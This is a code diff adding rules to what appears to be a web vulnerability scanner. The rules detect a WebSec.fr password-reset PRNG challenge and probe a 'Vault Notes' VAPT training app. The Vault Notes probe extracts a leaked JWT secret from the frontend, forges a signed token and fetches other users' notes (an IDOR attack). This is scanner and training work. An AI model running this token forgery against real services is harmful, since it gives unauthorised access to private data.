@@ -19259,6 +19259,76 @@ const clientSideWebsecTimingAttackChallengeEvidence: Rule = async (ctx) => {
   };
 };
 
+// --- WebSec.fr password-reset PHP rand/CSRF (level19) -----------------------------------
+const CLIENT_WEBSEC_PASSWORD_RESET_PRNG_CHALLENGE_RES: { label: string; re: RegExp }[] = [
+  {
+    label: "WebSec Level Nineteen challenge title",
+    re: /#WebSec\s+Level\s+Nineteen|Level\s+Nineteen(?:&nbsp;|\s)*<small>\s*-\s*Password reset/i
+  },
+  {
+    label: "Password recovery email flow",
+    re: /send_flag_by_email|Password\s+recovery\s+email\s+sent|level19@/i
+  },
+  {
+    label: "Captcha gate before token refresh",
+    re: /generate_random_text\s*\(\s*255\s*\/\s*10|clownflare|captcha/i
+  },
+  {
+    label: "Anti-CSRF token via generate_random_text",
+    re: /check_and_refresh_token|anti[-_]?csrf|init_token/i
+  },
+  {
+    label: "PHP rand seeded with microtime",
+    re: /srand\s*\(\s*microtime|function\s+generate_random_text/i
+  }
+];
+
+const clientSideWebsecPasswordResetPrngChallengeEvidence: Rule = async (ctx) => {
+  const hits: { label: string; sample: string }[] = [];
+  for (const { label, re } of CLIENT_WEBSEC_PASSWORD_RESET_PRNG_CHALLENGE_RES) {
+    const m = ctx.combined.match(re);
+    if (m) hits.push({ label, sample: m[0].slice(0, 100) });
+  }
+  if (hits.length < 3) return NEGATIVE;
+  if (!/websec\.fr|Level\s+Nineteen|#WebSec|Password reset/i.test(ctx.combined)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: hits.length >= 4 ? 0.91 : 0.88,
+    evidence: {
+      markers: hits.slice(0, 4),
+      note: "WebSec.fr level19 documents password-reset captcha gated by PHP rand() seeded with microtime() and anti-CSRF tokens from generate_random_text() — predictable PRNG oracle"
+    }
+  };
+};
+
+const websecLevel19PasswordResetRouteLiveOracle: Rule = async (ctx) => {
+  if (!/websec\.fr/i.test(ctx.origin)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  let pathname = "";
+  try {
+    pathname = new URL(pageUrl, ctx.origin).pathname;
+  } catch {
+    return NEGATIVE;
+  }
+  if (!/\/level19\/?$/i.test(pathname)) return NEGATIVE;
+  const corpus = ctx.combined;
+  const markers: string[] = [];
+  if (/Level\s+Nineteen[\s\S]{0,80}Password reset/i.test(corpus)) markers.push("level19-password-reset-title");
+  if (/srand\s*\(\s*microtime|generate_random_text/i.test(corpus)) markers.push("php-rand-microtime-seed");
+  if (/check_and_refresh_token|anti[-_]?csrf|init_token/i.test(corpus)) markers.push("anti-csrf-token-flow");
+  if (/send_flag_by_email|level19@/i.test(corpus)) markers.push("password-recovery-email");
+  if (markers.length < 3) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: markers.length >= 4 ? 0.92 : 0.9,
+    evidence: {
+      scannedUrl: pageUrl,
+      markers,
+      note: "WebSec.fr /level19 route scan — password-reset flow uses microtime-seeded PHP rand() captcha and generate_random_text() anti-CSRF tokens — predictable PRNG/CSRF oracle"
+    }
+  };
+};
+
 // --- WebSec.fr PHP unserialize cookie gadget (level18) ----------------------------------
 const CLIENT_WEBSEC_PHP_UNSERIALIZE_COOKIE_CHALLENGE_RES: { label: string; re: RegExp }[] = [
   {
@@ -75773,6 +75843,150 @@ const vulnDemoJwtSecretLeakRouteLiveOracle: Rule = async (ctx) => {
   };
 };
 
+// --- Vault Notes VAPT training app (vault-notes-frontend-gules.vercel.app) -----------
+const VAULT_NOTES_FRONTEND_HOST_RE = /vault-notes-frontend-gules\.vercel\.app/i;
+const VAULT_NOTES_BACKEND_ORIGIN = "https://vault-notes-backend.onrender.com";
+
+function isVaultNotesHost(ctx: RuleContext): boolean {
+  return (
+    VAULT_NOTES_FRONTEND_HOST_RE.test(ctx.origin) ||
+    /vault-notes-backend\.onrender\.com/i.test(ctx.origin)
+  );
+}
+
+function extractVaultNotesJwtSecret(text: string): string | null {
+  const m = text.match(/__leakedJwtSecret\s*=\s*[`'"]([^`'"]{8,})[`'"]/);
+  return m?.[1] ?? null;
+}
+
+function signVaultNotesHs256Jwt(
+  payload: Record<string, unknown>,
+  secret: string
+): string {
+  const header = Buffer.from(JSON.stringify({ alg: "HS256", typ: "JWT" })).toString("base64url");
+  const body = Buffer.from(JSON.stringify(payload)).toString("base64url");
+  const data = `${header}.${body}`;
+  const sig = createHmac("sha256", secret).update(data).digest("base64url");
+  return `${data}.${sig}`;
+}
+
+const vaultNotesJwtSecretLeakLiveOracle: Rule = async (ctx) => {
+  if (!isVaultNotesHost(ctx)) return NEGATIVE;
+  const secret =
+    extractVaultNotesJwtSecret(ctx.combined) ??
+    extractVaultNotesJwtSecret(ctx.home.body);
+  if (!secret) return NEGATIVE;
+  if (!/vault-notes-backend\.onrender\.com/i.test(ctx.combined + ctx.home.body)) {
+    return NEGATIVE;
+  }
+  return {
+    fired: true,
+    confidence: 0.95,
+    evidence: {
+      leakedSecretPreview: `${secret.slice(0, 6)}…${secret.slice(-4)}`,
+      snippet: "window.__leakedJwtSecret assigned in frontend bundle",
+      note: "Vault Notes frontend exposes JWT signing secret via window.__leakedJwtSecret — hardcoded secret in client bundle (VAPT training oracle)"
+    }
+  };
+};
+
+const vaultNotesJwtSecretLeakRouteLiveOracle: Rule = async (ctx) => {
+  if (!isVaultNotesHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  let onFrontend = false;
+  try {
+    const u = new URL(pageUrl, ctx.origin);
+    onFrontend = VAULT_NOTES_FRONTEND_HOST_RE.test(u.hostname) && u.pathname === "/";
+  } catch {
+    return NEGATIVE;
+  }
+  if (!onFrontend) return NEGATIVE;
+  const result = await vaultNotesJwtSecretLeakLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Vault Notes frontend route scan — window.__leakedJwtSecret hardcoded in SPA bundle (VAPT training hardcoded-secret oracle)"
+    }
+  };
+};
+
+async function probeVaultNotesNotesIdor(
+  ctx: RuleContext,
+  secret: string
+): Promise<RuleResult | null> {
+  const forgedUserId = 999_001;
+  const token = signVaultNotesHs256Jwt(
+    { userId: forgedUserId, username: "thugir-idor-probe", exp: Math.floor(Date.now() / 1000) + 3600 },
+    secret
+  );
+  for (const noteId of [1, 2, 3]) {
+    const noteUrl = `${VAULT_NOTES_BACKEND_ORIGIN}/notes/${noteId}`;
+    const doc = await ctx.probe.get(noteUrl, {
+      headers: { Authorization: `Bearer ${token}` },
+      maxBytes: 4096,
+      timeoutMs: 15000
+    });
+    if (doc.status < 200 || doc.status >= 300) continue;
+    try {
+      const data = JSON.parse(doc.body) as { id?: number; user_id?: number; title?: string; content?: string };
+      if (!data.id || data.user_id === undefined) continue;
+      if (data.user_id === forgedUserId) continue;
+      return {
+        fired: true,
+        confidence: 0.94,
+        evidence: {
+          noteUrl,
+          forgedUserId,
+          noteOwnerId: data.user_id,
+          title: data.title,
+          snippet: doc.body.slice(0, 220).trim(),
+          note: `Vault Notes GET /notes/${noteId} returns note owned by user_id=${data.user_id} to forged JWT for userId=${forgedUserId} — missing ownership check IDOR oracle`
+        }
+      };
+    } catch {
+      /* try next id */
+    }
+  }
+  return null;
+}
+
+const vaultNotesNotesIdorLiveOracle: Rule = async (ctx) => {
+  if (!isVaultNotesHost(ctx)) return NEGATIVE;
+  const secret =
+    extractVaultNotesJwtSecret(ctx.combined) ??
+    extractVaultNotesJwtSecret(ctx.home.body);
+  if (!secret) return NEGATIVE;
+  const hit = await probeVaultNotesNotesIdor(ctx, secret);
+  return hit?.fired ? hit : NEGATIVE;
+};
+
+const vaultNotesNotesIdorRouteLiveOracle: Rule = async (ctx) => {
+  if (!isVaultNotesHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!VAULT_NOTES_FRONTEND_HOST_RE.test(pageUrl) && !/\/notes\/\d+/i.test(pageUrl)) {
+    return NEGATIVE;
+  }
+  const secret =
+    extractVaultNotesJwtSecret(ctx.combined) ??
+    extractVaultNotesJwtSecret(ctx.home.body);
+  if (!secret) return NEGATIVE;
+  const hit = await probeVaultNotesNotesIdor(ctx, secret);
+  if (!hit?.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: hit.confidence,
+    evidence: {
+      ...hit.evidence,
+      scannedUrl: pageUrl,
+      note: "Vault Notes route scan — forged JWT from leaked __leakedJwtSecret reads another user's note via GET /notes/:id without ownership check — IDOR oracle"
+    }
+  };
+};
+
 const vulnDemoFrontendFlagLeakLiveOracle: Rule = async (ctx) => {
   if (!VULN_DEMO_HOST_RE.test(ctx.origin)) return NEGATIVE;
   const postUrl = new URL(
@@ -92715,6 +92929,8 @@ export const RULES: Record<string, Rule> = {
   clientSideWebsecCreateFunctionChallengeEvidence,
   clientSideWebsecFibonacciEvalChallengeEvidence,
   clientSideWebsecTimingAttackChallengeEvidence,
+  clientSideWebsecPasswordResetPrngChallengeEvidence,
+  websecLevel19PasswordResetRouteLiveOracle,
   clientSideWebsecPhpUnserializeCookieChallengeEvidence,
   clientSideWebsecPhpUnserializeFilterChallengeEvidence,
   clientSideWebsecPhpAesSessionChallengeEvidence,
@@ -93734,6 +93950,10 @@ export const RULES: Record<string, Rule> = {
   vulnerableBountySiteUsersApiRouteLiveOracle,
   vulnDemoJwtSecretLeakLiveOracle,
   vulnDemoJwtSecretLeakRouteLiveOracle,
+  vaultNotesJwtSecretLeakLiveOracle,
+  vaultNotesJwtSecretLeakRouteLiveOracle,
+  vaultNotesNotesIdorLiveOracle,
+  vaultNotesNotesIdorRouteLiveOracle,
   vulnDemoFrontendFlagLeakLiveOracle,
   vulnDemoFrontendFlagLeakRouteLiveOracle,
   vulnDemoStoredXssLiveOracle,
